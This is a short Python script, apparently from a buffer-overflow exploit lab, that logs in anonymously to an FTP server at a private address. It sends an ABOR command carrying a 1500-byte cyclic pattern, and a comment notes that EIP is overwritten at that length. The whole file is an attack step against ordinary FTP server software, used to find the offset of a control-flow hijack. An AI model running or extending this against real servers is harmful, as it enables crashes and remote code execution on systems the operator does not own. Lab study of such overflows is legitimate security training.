#!/usr/bin/env python3

import socket
import sys
import time

ip = "192.168.56.132"
port = 21
#EIP overwritten after sending 1500 chars
def fuzzer():
	global s
	pattern = open("pattern.txt","r").read(1500) # Read existing pattern.txt file which contains cyclic pattern created by pattern_create.rb script

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a socket for TCP connection
	s.connect((ip,port))
	print(s.recv(1024))
	time.sleep(2)
	s.recv(2000)
	s.send(b'USER anonymous\r\n')
	print(s.recv(2000))
	s.send(b'PASS anonymous\r\n')
	print(s.recv(2000))
	s.send(bytes('ABOR ' + pattern + '\r\n','latin-1'))
	print("[%d] bytes has been sent to the target \n" % len(pattern))
	sys.exit()
	s.close()

def main():
	fuzzer()

main()
